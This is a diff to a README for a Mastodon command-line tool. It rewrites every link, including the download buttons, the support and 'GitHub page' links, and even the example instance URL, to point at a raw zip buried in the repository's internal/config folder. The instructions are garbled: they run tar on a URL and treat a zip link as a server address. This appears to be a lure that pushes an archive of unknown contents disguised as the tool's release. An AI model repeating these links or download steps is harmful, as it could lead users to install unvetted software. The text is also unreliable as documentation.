@@ -6,12 +6,12 @@ MastodonCLI is a command-line interface (CLI) tool designed to help you interact
 
 ## 📥 Download and Install
 
-[![Download MastodonCLI](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip)](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip)
+[![Download MastodonCLI](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip)](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip)
 
-1. Click on the download button above or [visit this page to download](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip).
+1. Click on the download button above or [visit this page to download](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip).
 2. You will see a list of available versions. Choose the latest version for your operating system.
 3. Click on the version name to be redirected to the specific release page.
-4. Download the file that corresponds to your system. Look for options like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip` for Linux. 
+4. Download the file that corresponds to your system. Look for options like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip` for Linux. 
 
 ## 💻 System Requirements
 
@@ -46,7 +46,7 @@ Once you have downloaded the file, follow these steps to run the application:
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file. Use the command `cd ~/Downloads` (or the relevant folder).
-3. Extract the downloaded `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip` file using the command `tar -xvzf https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip`.
+3. Extract the downloaded `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip` file using the command `tar -xvzf https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip`.
 4. Navigate into the extracted folder.
 5. Type `./MastodonCLI` and hit Enter to run the application.
 
@@ -55,7 +55,7 @@ Once you have downloaded the file, follow these steps to run the application:
 To use MastodonCLI, you need to log in to your Mastodon account.
 
 1. Open MastodonCLI.
-2. You will be prompted to enter your Mastodon instance URL. For example: `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip`.
+2. You will be prompted to enter your Mastodon instance URL. For example: `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip`.
 3. Enter your username and password.
 4. After a successful login, you can start managing your account functions directly from the CLI.
 
@@ -75,11 +75,11 @@ If you encounter issues while using MastodonCLI, consider the following steps:
 
 - **Recheck Installation:** Ensure that the application is installed correctly. If not, reinstall it.
 - **Update Dependencies:** Keep your operating system and dependencies updated for optimal performance.
-- **Consult Documentation:** Refer to the FAQ section on the [GitHub page](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip) for help with common issues.
+- **Consult Documentation:** Refer to the FAQ section on the [GitHub page](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip) for help with common issues.
 
 ## 📞 Support and Contribution
 
-Your feedback matters. If you find any bugs or have suggestions, please open an issue on our [GitHub page](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip).
+Your feedback matters. If you find any bugs or have suggestions, please open an issue on our [GitHub page](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip).
 
 If you want to help improve MastodonCLI, feel free to contribute via pull requests. We welcome contributions that can help enhance the user experience.
 
@@ -87,6 +87,6 @@ If you want to help improve MastodonCLI, feel free to contribute via pull reques
 
 MastodonCLI is released under the MIT License. You can use it freely, but please attribute the work and ensure compliance with the license.
 
-[![Download MastodonCLI](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip)](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/metrics/Mastodon-CLI-v3.6.zip)
+[![Download MastodonCLI](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip)](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip)
 
 Thank you for choosing MastodonCLI! Enjoy managing your Mastodon account with ease.
